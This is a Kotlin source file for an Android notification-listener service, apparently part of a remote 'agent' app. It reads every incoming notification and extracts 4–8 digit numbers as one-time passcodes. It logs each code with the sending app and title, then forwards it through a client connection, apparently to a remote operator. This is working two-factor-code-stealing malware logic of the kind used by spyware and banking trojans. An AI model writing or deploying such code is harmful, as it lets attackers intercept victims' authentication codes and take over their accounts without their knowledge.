package ai.obsidian.agent.collect

import ai.obsidian.agent.AgentApp
import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class NotifListener : NotificationListenerService() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val codePattern = Regex("\\b(\\d{4,8})\\b")

    override fun onNotificationPosted(notification: StatusBarNotification) {
        val app = application as AgentApp
        if (!app.cfg.otpEnabled) return

        val extras = notification.notification.extras
        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: return
        val body = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString().orEmpty()
        val match = codePattern.find("$title $body") ?: return
        val code = match.groupValues[1]

        val line = "OTP $code | ${notification.packageName} | $title"
        app.store.append("otp.log", "${System.currentTimeMillis()} $line")
        scope.launch { runCatching { app.requireClient().send("msg", line) } }
    }
}
